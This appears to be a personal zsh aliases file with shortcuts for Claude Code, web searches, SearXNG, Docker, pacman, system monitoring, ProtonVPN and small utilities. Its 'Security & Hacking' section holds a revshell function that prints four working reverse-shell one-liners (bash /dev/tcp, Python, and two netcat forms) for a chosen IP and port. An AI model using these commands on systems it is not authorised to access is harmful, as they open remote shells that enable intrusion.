# Claude Code & Dev Workflow Aliases
# Sourced from: ~/.config/claude/aliases.zsh

# ============================================
# Claude Code
# ============================================
alias clc='claude'
alias clr='claude --resume'               # Resume last session
alias clp='claude --print'                # One-shot, no interactive
alias cla='claude "$(wl-paste)"'          # Send clipboard to Claude

# ============================================
# Web Search (open in browser)
# ============================================
alias s='searxng-search'

_browser_search() {
    local url="$1"; shift
    local query=$(echo -n "$*" | jq -sRr @uri)
    firefox-developer-edition "${url}${query}" &>/dev/null &
}

ddg()  { _browser_search "https://duckduckgo.com/?q=" "$@"; }
ghs()  { _browser_search "https://github.com/search?q=" "$@"; }
so()   { _browser_search "https://stackoverflow.com/search?q=" "$@"; }
aw()   { _browser_search "https://wiki.archlinux.org/index.php?search=" "$@"; }
w()    { _browser_search "https://es.wikipedia.org/wiki/Special:Search?search=" "$@"; }
cve()  { _browser_search "https://www.exploit-db.com/search?q=" "$@"; }

# ============================================
# SearXNG Control
# ============================================
alias xs='systemctl --user start searxng.service'
alias xstop='systemctl --user stop searxng.service'
alias xr='systemctl --user restart searxng.service'
alias xstat='systemctl --user status searxng.service'
alias xl='docker logs -f searxng'

# ============================================
# Docker
# ============================================
alias d='docker'
alias dc='docker compose'
alias dps='docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"'
alias dlog='docker logs -f'
alias dex='docker exec -it'
alias dprune='docker system prune -af --volumes'

# ============================================
# Git Shortcuts
# ============================================
# alias gs='git status -sb'
# alias gl='git log --oneline --graph -20'
# alias gd='git diff'
# alias gds='git diff --staged'
# alias ga='git add'
# alias gc='git commit'
# alias gp='git push'
# alias gpf='git push --force-with-lease'    # Safe force push
# alias gpl='git pull --rebase'
# alias gsw='git switch'
# alias gsc='git switch -c'
# alias gst='git stash'
# alias gstp='git stash pop'
# alias gb='git branch -vv'
# alias gcp='git cherry-pick'

# ============================================
# System Monitoring
# ============================================
alias cpu='ps aux --sort=-%cpu | head -11'
alias mem='ps aux --sort=-%mem | head -11'
alias listening='ss -tulpn | grep LISTEN'  # ss > netstat
alias ports='ss -tulpn'
alias disk='df -h -x tmpfs -x devtmpfs'
alias io='iostat -xz 1 3 2>/dev/null || echo "Install sysstat: pacman -S sysstat"'

# ============================================
# Pacman / AUR
# ============================================
alias pacs='pacman -Ss'                    # Search repos
alias paci='sudo pacman -S'               # Install
alias pacr='sudo pacman -Rns'             # Remove with deps
alias pacu='sudo pacman -Syu'             # Full upgrade
alias pacq='pacman -Qs'                   # Search installed
alias pacinfo='pacman -Qi'                # Package info
alias pacfiles='pacman -Ql'               # List package files
alias pacown='pacman -Qo'                 # Who owns this file?
alias pacorphans='pacman -Qdt'            # Orphaned packages
alias pacclean='sudo pacman -Sc'          # Clean cache

# ============================================
# Security & Hacking (ethical only)
# ============================================
revshell() {
    local ip="${1:-127.0.0.1}" port="${2:-4444}"
    echo "Bash:   bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo "Python: python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
    echo "NC:     nc -e /bin/sh $ip $port"
    echo "NC alt: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
}

# ============================================
# ProtonVPN
# ============================================
alias vpnc='protonvpn connect'
alias vpnd='protonvpn disconnect'
alias vpni='protonvpn info'

# ============================================
# Quick Utils
# ============================================
alias j='jq .'                             # Pretty print JSON
alias b64='base64'                         # Encode base64
alias b64d='base64 -d'                     # Decode base64
alias serve='python -m http.server 8000'   # HTTP server
alias myip='curl -s ifconfig.me'           # Public IP
alias weather='curl -s wttr.in/?format=3'  # Quick weather
alias epoch='date +%s'                     # Unix timestamp
alias path='echo $PATH | tr ":" "\n"'      # Pretty print PATH
alias sizeof='du -sh'                      # Size of dir/file

# Clipboard helpers (Wayland)
alias clip='wl-copy'
alias paste='wl-paste'

# Quick file sharing (temp URLs)
transfer() {
    if [ $# -eq 0 ]; then echo "Usage: transfer <file>"; return 1; fi
    curl --progress-bar --upload-file "$1" "https://transfer.sh/$(basename "$1")" | tee /dev/null
    echo
}
